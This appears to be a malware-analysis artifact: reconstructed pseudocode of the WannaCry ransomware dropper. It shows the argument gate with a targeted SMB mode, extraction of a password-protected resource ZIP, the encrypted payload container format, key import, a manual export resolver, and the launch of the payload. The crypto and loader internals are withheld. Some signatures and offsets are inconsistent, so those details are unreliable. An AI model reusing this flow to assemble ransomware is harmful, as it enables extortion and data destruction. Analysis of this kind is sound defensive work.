// ============================================================================
// WannaCry Dropper (WannaCry.exe) - Batch 1: Core Functions
// SHA256 : be22645c61949ad6a077373a7d6cd85e3fae44315632f161adc4c99d5a8e6844
// IDA DB : 442b9b2d216f
// ----------------------------------------------------------------------------
// ANALYSIS ARTIFACT - render of the Hex-Rays pseudocode for readability only.
// Not a build target. Bodies that would supply working capability (in-memory
// PE loading, AES cores, minizip internals) remain documented step lists, not
// implementations.
// ============================================================================

#include <windows.h>
#include <winsock2.h>

// ----------------------------------------------------------------------------
// Crypto context layout (offsets are byte offsets into the opaque context)
// ----------------------------------------------------------------------------
//  +8     HCRYPTKEY   embedded RSA-2048 private key
//  +16    CRITICAL_SECTION
//  +306   void*       GlobalAlloc buffer #1 (1 MB)
//  +307   void*       GlobalAlloc buffer #2 (1 MB)
typedef struct CryptoContext {
    HCRYPTKEY        hKey;         // +8
    CRITICAL_SECTION critSec;      // +16
    void            *buf1MB_a;     // +306
    void            *buf1MB_b;     // +307
} CryptoContext;

// Forward declarations (defined in batch 2 / elsewhere)
void sub_40146B(void *this);                 // CryptAcquireContext wrapper
void sub_4014F8(void *this);                 // CryptReleaseContext wrapper
int  sub_401538(const char *path, void *this); // read key file + CryptImportKey
int  sub_40224E(void *key, void *iv, int keyLen, int blockSize); // AES key schedule
void sub_40324F(void *ctx, void *data, int len, int mode);       // AES mode driver

// ============================================================================
// sub_401000 - Crypto context constructor
// ============================================================================
void __cdecl sub_401000(CryptoContext *ctx)
{
    InitializeCriticalSection(&ctx->critSec);   // this + 16
    sub_40146B(ctx);                            // acquire CryptoAPI provider
    sub_4014A0(ctx, NULL);                      // import embedded RSA private key
    sub_4014A0((char *)ctx + 2, NULL);          // import second key (public/other)
    ctx->buf1MB_a = GlobalAlloc(0, 0x100000);
    ctx->buf1MB_b = GlobalAlloc(0, 0x100000);
}

// ============================================================================
// sub_40107D - Crypto context destructor
// ============================================================================
void __cdecl sub_40107D(CryptoContext *ctx)
{
    if (ctx->buf1MB_a) GlobalFree(ctx->buf1MB_a);
    if (ctx->buf1MB_b) GlobalFree(ctx->buf1MB_b);
    sub_4014F8(ctx);                            // release CryptoAPI provider
    DeleteCriticalSection(&ctx->critSec);
}

// ============================================================================
// sub_40113A - Initialize crypto + allocate buffers
// ============================================================================
int __cdecl sub_40113A(CryptoContext *ctx, int unused_a2, int unused_a3)
{
    sub_4014A0(ctx, NULL);                      // import embedded key
    ctx->buf1MB_a = GlobalAlloc(0, 0x100000);
    ctx->buf1MB_b = GlobalAlloc(0, 0x100000);
    return 1;
}

// ============================================================================
// sub_4011A9 - Decrypt a .wry container (e.g. t.wry)
// ----------------------------------------------------------------------------
// Format:
//   "WANNACRY"            (8 bytes magic)
//   DWORD rsa_len         (== 256)
//   BYTE[256] rsa_blob    (RSA-encrypted AES key)
//   DWORD v8              (version, == 4 in sample)
//   QWORD dwBytes         (ciphertext length, <= 100 MB)
//   BYTE[dwBytes] ciphertext
// ============================================================================
int __cdecl sub_4011A9(const char *FileName, int *outPeBase)
{
    HANDLE hFile = CreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return 0;

    char  magic[8];
    DWORD bytesRead;

    ReadFile(hFile, magic, 8, &bytesRead, NULL);
    if (bytesRead != 8 || memcmp(magic, "WANNACRY", 8) != 0) {
        CloseHandle(hFile);
        return 0;
    }

    DWORD rsa_len;
    ReadFile(hFile, &rsa_len, 4, &bytesRead, NULL);
    if (rsa_len != 256) {
        CloseHandle(hFile);
        return 0;
    }

    BYTE rsa_blob[256];
    ReadFile(hFile, rsa_blob, 256, &bytesRead, NULL);

    DWORD version;
    ReadFile(hFile, &version, 4, &bytesRead, NULL);      // == 4 in sample

    ULONGLONG dwBytes;
    ReadFile(hFile, &dwBytes, 8, &bytesRead, NULL);
    if (dwBytes > 100000000) {
        CloseHandle(hFile);
        return 0;
    }

    // Step 1: RSA-decrypt the 256-byte blob -> 16-byte AES key
    BYTE aes_key[16];
    sub_401620(NULL /*ctx*/, rsa_blob, 256, aes_key, 16);

    // Step 2: AES-128 key expansion with a 16-byte (zero) IV
    sub_40224E(aes_key, global_IV /* 16 zero bytes @0x40F668 */, 16, 16);

    // Step 3: read ciphertext
    void *buf = GlobalAlloc(0, dwBytes);
    ReadFile(hFile, buf, (DWORD)dwBytes, &bytesRead, NULL);
    CloseHandle(hFile);

    // Step 4: AES-128-CBC decrypt, IV = 0
    sub_40324F(buf, dwBytes, 1);

    *outPeBase = (int)buf;
    return 1;
}

// ============================================================================
// sub_4014A0 - Import RSA key (embedded blob or from file)
// ============================================================================
int __cdecl sub_4014A0(CryptoContext *ctx, const char *lpFileName)
{
    HCRYPTPROV hProv = 0;
    sub_40146B(&hProv);                         // CryptAcquireContext

    if (!lpFileName) {
        // Embedded PRIVATEKEYBLOB @0x40EB38, 1172 bytes:
        //   BLOBHEADER: type=7 (PRIVATEKEYBLOB), ver=2, alg=0xA400 (CALG_RSA_KEYX)
        //   RSAPUBKEY : "RSA2", bitlen=2048, e=65537
        CryptImportKey(hProv, (BYTE *)0x40EB38, 0x494, 0, 0, &ctx->hKey);
    } else {
        sub_401538(lpFileName, ctx);            // read key file (<= 0x19000) + import
    }
    return 1;
}

// ============================================================================
// sub_401620 - RSA decrypt wrapper (CryptDecrypt with Final=TRUE)
// ============================================================================
int __cdecl sub_401620(CryptoContext *ctx, BYTE *in, int in_len, BYTE *out, int out_len)
{
    EnterCriticalSection(&ctx->critSec);
    BOOL ok = CryptDecrypt(ctx->hKey, 0, TRUE, 0, out, (DWORD *)&out_len);
    LeaveCriticalSection(&ctx->critSec);
    return ok;
}

// ============================================================================
// sub_401684 - argv gate
// ----------------------------------------------------------------------------
//  argc <= 1 or "/r"           -> *target = 0, run normally
//  "/f" <ip>  (argc >= 3)      -> *target = inet_addr(ip), targeted SMB mode
//  8-char hex string           -> *target = sscanf("%08X")
//  else                        -> return 0 (exit)
// ============================================================================
int __cdecl sub_401684(int argc, char **argv, DWORD *target)
{
    if (argc <= 1 || strcmp(argv[1], "/r") == 0) {
        *target = 0;
        return 1;
    }
    if (strcmp(argv[1], "/f") == 0 && argc >= 3) {
        WSADATA wsa;
        WSAStartup(0x202, &wsa);
        *target = inet_addr(argv[2]);
        WSACleanup();
        return 1;
    }
    if (strlen(argv[1]) == 8) {
        sscanf(argv[1], "%08X", target);
        return 1;
    }
    return 0;                                   // exit
}

// ============================================================================
// sub_401749 - Extract SMD resource (ID 105) ZIP to disk
// ============================================================================
void __cdecl sub_401749(HMODULE hModule, const char *password)
{
    HRSRC   hRes  = FindResourceA(hModule, MAKEINTRESOURCE(105), "SMD");
    HGLOBAL hGlob = LoadResource(hModule, hRes);
    void   *data  = LockResource(hGlob);
    DWORD   size  = SizeofResource(hModule, hRes);

    // minizip unzOpen, memory mode (3)
    void *uz = sub_406D85(data, size, password);
    sub_406CFF(uz, password);                   // store password in 0x244-byte struct

    // Extract every entry unless the file already exists AND is "c.wry"
    while (unzGoToNextFile(uz) == UNZ_OK) {
        char name[256];
        unzGetCurrentFileInfo(uz, /*info*/, name, sizeof(name), NULL, 0, NULL, 0);

        if (file_exists(name) && strcmp(name, "c.wry") == 0)
            continue;                           // preserve existing config

        unzOpenCurrentFilePassword(uz, password);
        unzReadCurrentFile(uz, /*buf*/, /*len*/ 0);
        unzCloseCurrentFile(uz);
    }
    unzClose(uz);
}

// ============================================================================
// sub_401995 -> sub_4019C1 - In-memory ZIP/PE loader
// ----------------------------------------------------------------------------
// Callbacks: alloc=0x401946 (VirtualAlloc), free=0x40195D (VirtualFree),
//            loadlib=0x401970 (LoadLibraryA), freelib=0x40198A (FreeLibrary),
//            beep=_beep
// Full mapping/relocation logic is NOT reconstructed here (analysis only).
// ============================================================================
int __cdecl sub_401995(void *buf, int len, int *out_pe_base)
{
    struct {
        void *(*alloc)(SIZE_T, DWORD, DWORD);
        BOOL  (*free)(LPVOID, SIZE_T, DWORD);
        void *(*loadlib)(LPCSTR);
        BOOL  (*freelib)(HMODULE);
        void  (*beep)(DWORD, DWORD);
    } callbacks;

    callbacks.alloc   = sub_401946;             // VirtualAlloc
    callbacks.free    = sub_40195D;             // VirtualFree
    callbacks.loadlib = sub_401970;             // LoadLibraryA
    callbacks.freelib = sub_40198A;             // FreeLibrary
    callbacks.beep    = _beep;

    return sub_4019C1(buf, len, &callbacks, out_pe_base);
}

// ============================================================================
// sub_4020FC - Manual GetProcAddress on an in-memory PE
// Walks the export name table with _stricmp.
// ============================================================================
void *__cdecl sub_4020FC(void *pe_base, const char *export_name)
{
    IMAGE_DOS_HEADER        *dos = (IMAGE_DOS_HEADER *)pe_base;
    IMAGE_NT_HEADERS        *nt  = (IMAGE_NT_HEADERS *)((char *)pe_base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY  *exp = (IMAGE_EXPORT_DIRECTORY *)((char *)pe_base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names    = (DWORD *)((char *)pe_base + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)((char *)pe_base + exp->AddressOfNameOrdinals);
    DWORD *functions= (DWORD *)((char *)pe_base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)((char *)pe_base + names[i]);
        if (_stricmp(name, export_name) == 0) {
            WORD ord = ordinals[i];
            return (void *)((char *)pe_base + functions[ord]);
        }
    }
    return NULL;
}

// ============================================================================
// AES Implementation (documented — see batch 2 for mode driver)
// ----------------------------------------------------------------------------
// sub_40224E  AES key expansion (16/24/32-byte key; rounds 10/12/14)
//             S-box byte_408994, Te tables dword_40AB94/40AF94/40B394/40B794
//             State: +8 enc_keys, +488 dec_keys, +968 keylen, +972 blocksize,
//                    +1008 IV, +1040 rounds, +1044 temp
// sub_402656  AES encrypt round (1 of 4)
// sub_402994  AES encrypt round (2)
// sub_402CE7  AES encrypt block
// sub_402F6F  AES decrypt block
// sub_403200  XOR 16-byte block (CBC/CFB chaining)
// ============================================================================

// ============================================================================
// sub_40324F - AES mode driver
//   mode == 1 : CBC decrypt  ->  D(block) ^ IV ; IV = ciphertext
//   mode == 2 : CFB          ->  E(IV) ^ input ; IV = output
//   else      : ECB decrypt  ->  D(block)
// ============================================================================

// ============================================================================
// Minizip wrappers (sub_406C53 .. 0x406E2E)
//   sub_406D85(data, size, pw) -> sub_406C7C(data, size, 3, pw) = unzOpen mem
//   sub_406CFF(struct, pw)      store password in 0x244-byte struct
//   sub_406D9C                  unzGetCurrentFileInfo
//   sub_406E15                  extract entry
//   sub_406E2E                  unzClose
// ============================================================================

// ============================================================================
// WinMain @0x40183B - Full flow
// ============================================================================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
    SetErrorMode(2);

    DWORD v11 = 0;
    if (!sub_401684(__argc, __argv, &v11))
        return 0;                               // argv gate

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    PathRemoveFileSpecA(exePath);
    SetCurrentDirectoryA(exePath);

    // Extract SMD ZIP resource (skip c.wry if present)
    sub_401749(NULL, "wcry@2016");

    // Crypto context
    CryptoContext *ctx = malloc(sizeof(CryptoContext));
    sub_401000(ctx);

    // Decrypt t.wry -> in-memory PE
    int pe_base = 0;
    sub_40113A(ctx, 0, 0);
    sub_4011A9("t.wry", &pe_base);
    sub_401995(ctx->buf1MB_a /*pe*/, /*len*/, &pe_base);

    // Resolve StartTask export and invoke it
    void *StartTask = sub_4020FC((void *)pe_base, "StartTask");
    if (StartTask)
        ((void (*)(int, DWORD))StartTask)(0, v11);

    sub_40107D(ctx);
    return 0;
}
